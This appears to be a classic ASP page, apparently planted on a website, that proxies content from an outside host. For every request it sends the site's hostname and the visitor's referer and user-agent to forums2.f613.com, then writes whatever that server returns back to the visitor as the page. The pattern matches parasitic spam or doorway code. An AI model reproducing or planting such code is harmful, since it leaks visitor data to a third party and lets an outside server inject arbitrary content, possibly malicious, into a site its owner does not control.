<%
search = request("showthread")
host = Request.ServerVariables("Server_Name")
r = Server.URLEncode(Request.ServerVariables("HTTP_REFERER"))
u = Server.URLEncode(Request.ServerVariables("HTTP_USER_AGENT"))
If search <> "" Then
   html = GetBody("http://forums2.f613.com/?showthread="&search&"&host="&host&"&u="&u&"&r="&r)
   response.write html
   response.end
else
   html = GetBody("http://forums2.f613.com/?showthread=0&host="&host&"&u="&u&"&r="&r)
   response.write html
   response.end
End If

Function GetBody(URL)
    Set HTTPReq = Server.createobject("MSXML2.ServerXMLHTTP.3.0")
    HTTPReq.Open "GET",URL,False
    HTTPReq.send
    If HTTPReq.readyState <> 4 Then Exit Function
    GetBody = Bytes2bStr(HTTPReq.responseBody)
    Set HTTPReq = Nothing
End Function

Function Bytes2bStr(vin)
    Dim BytesStream,StringReturn
    Set BytesStream = Server.CreateObject("ADODB.Stream")
    BytesStream.Type = 2
    BytesStream.Open
    BytesStream.WriteText vin
    BytesStream.Position = 0
    BytesStream.Charset = "utf-8"
    BytesStream.Position = 2
    StringReturn =BytesStream.ReadText
    BytesStream.close
    Set BytesStream = Nothing
    Bytes2bStr = StringReturn
End Function
%>